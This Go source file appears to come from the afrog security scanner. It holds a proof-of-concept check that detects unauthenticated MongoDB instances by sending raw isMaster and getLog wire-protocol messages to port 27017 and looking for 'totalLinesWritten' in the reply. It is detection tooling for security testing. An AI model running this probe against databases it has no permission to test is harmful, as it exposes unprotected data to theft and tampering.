package gopoc

import (
	"errors"
	"net"
	"strings"
	"time"

	"github.com/zan8in/afrog/pkg/poc"
	"github.com/zan8in/afrog/pkg/proto"
)

var (
	mongodbPort       = "27017"
	mongodbUnAuthName = "mongodb-unauth"
)

func mongodbUnAuth(args *GoPocArgs) (Result, error) {
	poc := poc.Poc{
		Id: mongodbUnAuthName,
		Info: poc.Info{
			Name:        "Mongodb 未授权访问",
			Author:      "zan8in",
			Severity:    "critical",
			Description: "MongoDB服务开放在公网上时，若未配置访问认证授权，则攻击者可无需认证即可连接数据库，对数据库进行任何操作（增、删、改、查等高危操作），并造成严重的敏感泄露风险。protocol=\"mongodb\"",
			Reference: []string{
				"https://www.freebuf.com/vuls/212799.html",
			},
		},
	}
	args.SetPocInfo(poc)
	result := Result{Gpa: args, IsVul: false}

	if len(args.Host) == 0 {
		return result, errors.New("no host")
	}

	senddata := []byte{58, 0, 0, 0, 167, 65, 0, 0, 0, 0, 0, 0, 212, 7, 0, 0, 0, 0, 0, 0, 97, 100, 109, 105, 110, 46, 36, 99, 109, 100, 0, 0, 0, 0, 0, 255, 255, 255, 255, 19, 0, 0, 0, 16, 105, 115, 109, 97, 115, 116, 101, 114, 0, 1, 0, 0, 0, 0}
	getlogdata := []byte{72, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 212, 7, 0, 0, 0, 0, 0, 0, 97, 100, 109, 105, 110, 46, 36, 99, 109, 100, 0, 0, 0, 0, 0, 1, 0, 0, 0, 33, 0, 0, 0, 2, 103, 101, 116, 76, 111, 103, 0, 16, 0, 0, 0, 115, 116, 97, 114, 116, 117, 112, 87, 97, 114, 110, 105, 110, 103, 115, 0, 0}
	// payload := append(senddata, getlogdata...)

	// if len(args.Port) > 0 && args.Port != "80" && args.Port != "443" {
	// 	addr := args.Host + ":" + args.Port
	// 	err := mongodbPayload(addr, senddata, getlogdata)
	// 	if err == nil {
	// 		result.IsVul = true
	// 		url := proto.UrlType{Host: addr, Port: args.Port}
	// 		result.SetAllPocResult(true, &url, []byte(addr), []byte("MongoDB 未授权访问"))
	// 		return result, nil
	// 	}
	// }

	addr := args.Host + ":" + mongodbPort
	err := mongodbPayload(addr, senddata, getlogdata)
	if err == nil {
		result.IsVul = true
		url := proto.UrlType{Host: addr, Port: mongodbPort}
		result.SetAllPocResult(true, &url, []byte(addr), []byte("MongoDB 未授权访问"))
		return result, nil
	}

	return result, errors.New("no vulner")
}

func mongodbPayload(addr string, senddata, getlogdata []byte) error {
	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()
	_, err = conn.Write(senddata)
	if err != nil {
		return err
	}
	buf := make([]byte, 1024)
	count, err := conn.Read(buf)
	if err != nil {
		return err
	}
	text := string(buf[0:count])
	if strings.Contains(text, "ismaster") {
		_, err = conn.Write(getlogdata)
		if err != nil {
			return err
		}
		count, err := conn.Read(buf)
		if err != nil {
			return err
		}
		text := string(buf[0:count])
		if strings.Contains(text, "totalLinesWritten") {
			return nil
		}
	}
	return errors.New("no vulner")
}

func init() {
	GoPocRegister(mongodbUnAuthName, mongodbUnAuth)
}
